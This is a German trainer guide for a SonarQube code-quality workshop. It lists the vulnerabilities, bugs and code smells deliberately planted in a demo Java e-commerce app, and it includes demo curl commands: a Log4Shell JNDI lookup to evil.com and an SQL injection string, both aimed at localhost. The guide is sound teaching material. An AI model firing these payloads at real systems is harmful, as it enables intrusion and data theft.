# 🎓 TRAINER GUIDE - Alle Issues im Überblick

Diese Datei ist **NUR FÜR TRAINER** - nicht an Teilnehmer weitergeben!

## 📊 Issue-Übersicht

**Total**: 103 Issues  
**CVEs**: 6  
**Security Hotspots**: 16  
**Bugs**: 21  
**Code Smells**: 60  

---

## 🔥 CVE VULNERABILITIES (6)

| # | CVE | Library | Version | CVSS | Location | Fix Version |
|---|-----|---------|---------|------|----------|-------------|
| 1 | CVE-2021-44228 | log4j-core | 2.14.1 | 10.0 | pom.xml:35 | 2.20.0 |
| 2 | CVE-2021-45046 | log4j-core | 2.14.1 | 9.0 | pom.xml:35 | 2.20.0 |
| 3 | CVE-2019-12384 | jackson-databind | 2.9.8 | 9.8 | pom.xml:47 | 2.15.2 |
| 4 | CVE-2016-1000031 | commons-fileupload | 1.3.1 | 7.5 | pom.xml:52 | 1.5 |
| 5 | CVE-2018-3258 | mysql-connector | 5.1.42 | 6.5 | pom.xml:63 | 8.0.28 |
| 6 | DEPRECATED | commons-collections | 3.2.1 | - | pom.xml:57 | 4.4 |

**Verwendet in**:
- Log4j: UserService.java (L20, L38, L52, L122, L193), OrderService.java (L21, L34, L93, L134), UserController.java (L15, L24, L35, L42), OrderController.java (L18, L28, L45, L52)
- Jackson: UserService.java (L21, L128-138)
- Commons Collections: UserService.java (L24)

---

## 🚨 SECURITY HOTSPOTS (16)

| # | Type | Severity | File | Line | Method | Description |
|---|------|----------|------|------|--------|-------------|
| 1 | SQL Injection | CRITICAL | UserService.java | 50-53 | searchUsersByEmail | String concatenation in query |
| 2 | SQL Injection | CRITICAL | OrderService.java | 120-123 | searchOrdersByProduct | String concatenation in query |
| 3 | SQL Injection | CRITICAL | UserRepository.java | 35-36 | searchByEmailVulnerable | Native query with concat |
| 4 | SQL Injection | HIGH | UserRepository.java | 40-43 | findUserByIdVulnerable | Native query with concat |
| 5 | SQL Injection | HIGH | OrderService.java | 168-169 | getOrdersByStatus | JPQL with concat |
| 6 | Log Injection | HIGH | UserService.java | 38 | getUserByEmail | User input logged |
| 7 | Log Injection | HIGH | UserService.java | 52 | searchUsersByEmail | Query logged |
| 8 | Log Injection | HIGH | UserService.java | 122 | updateUserProfile | Email logged |
| 9 | Log Injection | HIGH | UserService.java | 193 | createUser | Email logged |
| 10 | Log Injection | HIGH | OrderService.java | 34 | createOrder | Product name logged |
| 11 | Log Injection | HIGH | OrderService.java | 123 | searchOrdersByProduct | Query logged |
| 12 | Hardcoded Credential | HIGH | UserService.java | 31 | Field | adminPassword = "admin123" |
| 13 | Hardcoded Credential | HIGH | UserController.java | 50-51 | getAdminInfo | adminUser/adminPass |
| 14 | Weak Password Storage | HIGH | User.java | 70 | getPassword | Password getter exists |
| 15 | Weak Password Storage | HIGH | User.java | 74 | setPassword | No hashing |
| 16 | Sensitive Data Exposure | MEDIUM | Order.java | 104 | getPaymentMethod | Plaintext payment |

---

## 🐛 BUGS (21)

| # | Type | Severity | File | Line | Method | Description |
|---|------|----------|------|------|--------|-------------|
| 1 | NullPointerException | HIGH | UserService.java | 109-110 | getUserFullName | No null check for user |
| 2 | NullPointerException | MEDIUM | OrderService.java | 170-172 | getTotalRevenue | Unused user variable |
| 3 | NullPointerException | MEDIUM | UserController.java | 29-30 | getUserById | Could return null |
| 4 | ArrayIndexOutOfBounds | HIGH | UserRepository.java | 43 | findUserByIdVulnerable | No check if list empty |
| 5 | Empty Catch Block | MEDIUM | UserService.java | 122-124 | updateUserProfile | Exception swallowed |
| 6 | Empty Catch Block | MEDIUM | OrderService.java | 158-162 | cancelOrder | Exception swallowed |
| 7 | Resource Leak | MEDIUM | OrderService.java | 168-169 | getOrdersByStatus | Query not closed |
| 8 | Missing equals() | LOW | UserService.java | 142-144 | hashCode | Has hashCode but no equals |
| 9 | Missing equals/hashCode | LOW | User.java | - | Entity | JPA entity without equals/hashCode |
| 10 | Missing equals/hashCode | LOW | Order.java | - | Entity | JPA entity without equals/hashCode |
| 11 | Mutable Date Return | LOW | User.java | 143 | getCreatedAt | Returns mutable Date |
| 12 | Mutable Date Return | LOW | Order.java | 91 | getOrderDate | Returns mutable Date |
| 13 | Mutable Collection Return | LOW | User.java | 135 | getOrders | Returns mutable List |
| 14 | Public Field | MEDIUM | User.java | 16 | email | Field should be private |
| 15 | Returning null Collections | LOW | UserService.java | 138 | deserializeUser | Returns null instead of empty |
| 16 | Returning null | LOW | OrderService.java | 44 | createOrder | Returns null on error |
| 17 | Returning null | LOW | OrderService.java | 132 | updateOrderStatus | Returns null on error |
| 18 | Unchecked Type Cast | LOW | UserRepository.java | 36 | searchByEmailVulnerable | @SuppressWarnings used |
| 19 | Unchecked Type Cast | LOW | OrderService.java | 122 | searchOrdersByProduct | @SuppressWarnings used |
| 20 | Potential Division by Zero | LOW | OrderController.java | 115 | getUserStats | orders.isEmpty check exists but risky |
| 21 | Business Logic Bug | MEDIUM | OrderService.java | 66-82 | calculateTotal | Inconsistent discount logic |

---

## 📝 CODE SMELLS (60+)

### Cognitive Complexity (2)

| # | File | Line | Method | Complexity | Limit | Issue |
|---|------|------|--------|------------|-------|-------|
| 1 | UserService.java | 55-82 | validateAndProcessUser | 20 | 15 | Too many nested ifs |
| 2 | OrderService.java | 62-83 | calculateTotal | 15 | 15 | Complex discount logic |

### Code Duplication (4)

| # | Files | Lines | Similarity | Description |
|---|-------|-------|------------|-------------|
| 1 | UserService.java | 55-82, 84-99 | 80% | Validation logic duplicated |
| 2 | OrderService.java | 62-83, 105-121 | 70% | Discount calculation duplicated |
| 3 | UserService.java | 38, 52, 122, 193 | 100% | Log statements duplicated |
| 4 | OrderService.java | 34, 123, 134, 188 | 100% | Log statements duplicated |

### Magic Numbers (23)

| # | File | Line | Value | Context |
|---|------|------|-------|---------|
| 1 | UserService.java | 116 | 10 | totalOrders threshold |
| 2 | UserService.java | 116 | 500.00 | totalSpent threshold |
| 3 | UserService.java | 117 | 65 | senior age |
| 4 | UserService.java | 117 | 25 | young age |
| 5 | UserService.java | 143 | 42 | hashCode return |
| 6 | UserService.java | 151 | 0.9 | discount multiplier |
| 7 | UserService.java | 153 | 0.95 | discount multiplier |
| 8 | OrderService.java | 66 | 5 | quantity threshold |
| 9 | OrderService.java | 67 | 100 | total threshold |
| 10 | OrderService.java | 68 | 0.85 | discount multiplier |
| 11 | OrderService.java | 70 | 0.9 | discount multiplier |
| 12 | OrderService.java | 73 | 0.9 | discount multiplier |
| 13 | OrderService.java | 76 | 10 | quantity threshold |
| 14 | OrderService.java | 77 | 0.95 | discount multiplier |
| 15 | OrderService.java | 78 | 5 | quantity threshold |
| 16 | OrderService.java | 79 | 0.97 | discount multiplier |
| 17 | OrderService.java | 110 | 5 | quantity threshold |
| 18 | OrderService.java | 111 | 0.15 | discount rate |
| 19 | OrderService.java | 113 | 0.1 | discount rate |
| 20 | OrderService.java | 116 | 10 | quantity threshold |
| 21 | OrderService.java | 117 | 0.05 | discount rate |
| 22 | OrderService.java | 118 | 5 | quantity threshold |
| 23 | OrderService.java | 119 | 0.03 | discount rate |

### Inefficient Operations (2)

| # | File | Line | Method | Issue |
|---|------|------|--------|-------|
| 1 | UserService.java | 146-152 | generateUserReport | String concatenation in loop |
| 2 | OrderService.java | 140-150 | generateOrderReport | String concatenation in loop |

### Dead Code (2)

| # | File | Line | Method | Never Called By |
|---|------|------|--------|-----------------|
| 1 | UserService.java | 113-115 | unusedMethod | - |
| 2 | OrderService.java | 181-183 | unusedRefundMethod | - |

### Too Many Parameters (1)

| # | File | Line | Method | Params | Limit |
|---|------|------|--------|--------|-------|
| 1 | UserService.java | 157-163 | createUserWithDetails | 14 | 7 |

### Parameter Issues (2)

| # | File | Line | Method | Issue |
|---|------|------|--------|-------|
| 1 | UserService.java | 147-155 | calculateDiscount | Parameter reassignment (price) |
| 2 | UserService.java | 168-174 | processUser | Boolean flag argument (isAdmin) |

### Missing Documentation (11)

All classes and public methods lack JavaDoc

### Naming Issues (5)

| # | File | Line | Issue |
|---|------|------|-------|
| 1 | UserService.java | 24 | legacyCache - raw type |
| 2 | UserRepository.java | 35 | searchByEmailVulnerable - bad name |
| 3 | OrderController.java | 69 | request - too generic |
| 4 | OrderService.java | 181 | unusedRefundMethod - dead code |
| 5 | UserService.java | 113 | unusedMethod - dead code |

### Design Issues (8)

| # | Type | Files | Description |
|---|------|-------|-------------|
| 1 | God Class | UserService.java | Too many responsibilities |
| 2 | God Class | OrderService.java | Too many responsibilities |
| 3 | Anemic Model | User.java, Order.java | Only getters/setters |
| 4 | Feature Envy | OrderService.java:62-83 | Uses User methods too much |
| 5 | Long Method | UserService.java:55-82 | 27 lines |
| 6 | Long Method | OrderService.java:30-58 | 28 lines |
| 7 | Data Clumps | CreateOrderRequest | Should be separate class |
| 8 | Primitive Obsession | Throughout | Using primitives instead of value objects |

---

## 🎯 Workshop Progression

### Phase 0: IDE Setup (15 Min)
**Vor dem eigentlichen Workshop:**

**Für Teilnehmer:**
1. IntelliJ IDEA installiert? (Community reicht)
2. SonarQube for IDE Plugin installiert?
3. Projekt öffnen: `File` → `Open` → `ecommerce-app`
4. Maven Dependencies laden (automatisch)
5. Warten bis Indexierung fertig

**Als Trainer zeigen:**
```bash
# Projekt in IntelliJ öffnen
cd ecommerce-app
idea .  # oder manuell öffnen
```

**Live-Demo SonarQube for IDE:**
1. Öffne `UserService.java`
2. Zeige gelbe/rote Wellenlinien
3. Click auf Issue → Details
4. Zeige "SonarQube" Tab unten
5. Erklärung: "Das sind lokale Checks - CVEs sehen wir später bei SonarCloud"

**Diskussion:**
- Warum sehen wir schon Issues?
- Was fehlt noch? (CVEs, Team Rules, History)
- Wann nutzen wir welches Tool?

### Phase 1: Discovery (30 Min)
**Zeige den Teilnehmern:**
1. Starte Application
2. Teste API Endpoints
3. Führe SonarCloud Scan durch
4. Zeige Dashboard mit 100+ Issues

**Diskussion:**
- Warum so viele Issues?
- Was bedeuten die Severities?
- Wo anfangen?

### Phase 2: CVEs (30 Min)
**Focus: Dependency Vulnerabilities**

**Demo:**
```bash
# Zeige Log4Shell in Action
curl "http://localhost:8080/api/orders/search?product=\${jndi:ldap://evil.com}"
# Check Logs: Log4j versucht JNDI Lookup!
```

**Fix zusammen:**
1. pom.xml öffnen
2. log4j 2.14.1 → 2.20.0
3. Re-build & Re-scan
4. CVEs verschwinden!

### Phase 3: Security Hotspots (45 Min)
**Focus: SQL Injection**

**Demo:**
```bash
# Normal
curl "http://localhost:8080/api/users/search?email=alice"

# SQL Injection
curl "http://localhost:8080/api/users/search?email=' OR '1'='1"
# Gibt ALLE User zurück!
```

**Fix zusammen:**
```java
// Vorher
String query = "SELECT * FROM users WHERE email LIKE '%" + email + "%'";

// Nachher
TypedQuery<User> query = entityManager.createQuery(
    "SELECT u FROM User u WHERE u.email LIKE :email", User.class);
query.setParameter("email", "%" + email + "%");
```

### Phase 4: Code Quality (60 Min)

**Pick 3-4 Issues zum gemeinsam fixen:**

1. **Cognitive Complexity** - UserService.validateAndProcessUser()
2. **Code Duplication** - calculateTotal vs calculateDiscount
3. **Magic Numbers** - Alle 0.9, 0.95 etc.
4. **Empty Catch Block** - updateUserProfile()

### Phase 5: Re-Scan & Celebration (15 Min)

```bash
mvn clean verify sonar:sonar -Dsonar.token=YOUR_TOKEN
```

**Zeige Improvements:**
- Issues: 103 → 50-60
- Security Rating: E → C/B
- Technical Debt: 6 Tage → 3 Tage

---

## 💡 Trainer Tips

### Vorbereitung

1. **Vor Workshop:**
   - Teste alle Commands auf Windows UND Mac
   - **IntelliJ mit Plugin installieren & testen**
   - Scanne das Projekt selbst einmal
   - Screenshots vom Dashboard machen (Backup)
   - API Keys vorbereiten

2. **Hardware:**
   - HDMI Adapter dabei haben
   - Backup-Laptop (falls Demo-Laptop streikt)

3. **Timing:**
   - Rechne mit Technical Issues (30 Min Buffer)
   - IntelliJ Indexierung braucht Zeit (erste 5-10 Min)
   - Pausen einplanen (alle 90 Min)

4. **IntelliJ Demo vorbereiten:**
   - Plugin installiert & getestet
   - Wissen welche Files welche Issues zeigen
   - Shortcuts kennen: Alt+Enter (Quick Fix), F2 (Next Issue)

### Häufige Probleme

**"SonarQube for IDE zeigt keine Issues"**
→ Plugin installiert? IntelliJ neu gestartet? Indexierung fertig?

**"Zu viele Warnings in IntelliJ"**
→ Normal! Genau darum geht's. Filter nutzen: "SonarQube" Tab → "Severity: Critical/High"

**"IntelliJ hängt beim Indexieren"**
→ Zu wenig RAM. Hilfe: `Help` → `Edit Custom VM Options` → `-Xmx2048m` erhöhen

### Häufige Probleme

**"mvn command not found"**
→ PATH nicht gesetzt. Quick fix: Full path nutzen

**"Port 8080 in use"**
→ `-Dspring-boot.run.arguments=--server.port=8081`

**"SonarCloud Scan stuck"**
→ Firewall/Proxy Problem. Zeige Screenshots vom vorbereiteten Scan

**"Too many issues overwhelming"**
→ Filter nutzen! "Since last analysis", "New Code", "By Severity"

### Diskussionspunkte

1. **Warum so viele Issues?**
   - Legacy Code
   - Zeitdruck
   - Fehlende Reviews
   - Keine automatischen Gates

2. **Realistic Priority:**
   - CVEs first (Prod down!)
   - SQL Injection next (Data leak!)
   - NullPointers (Crashes)
   - Code Smells last (Technical Debt)

3. **Real World:**
   - "Perfect code" doesn't exist
   - Balance between speed & quality
   - Technical Debt must be managed
   - Automation is key

---

## 📊 Expected Results

After full workshop, participants should achieve:

- ✅ Fixed all CVEs (6 → 0)
- ✅ Fixed critical security issues (16 → 5-8)
- ✅ Improved Security Rating (E → B/C)
- ✅ Reduced Technical Debt (50%)
- ✅ Understand Quality Gates
- ✅ Know how to prioritize issues

---

**Diese Datei vertraulich behandeln - nur für Trainer!** 🎓
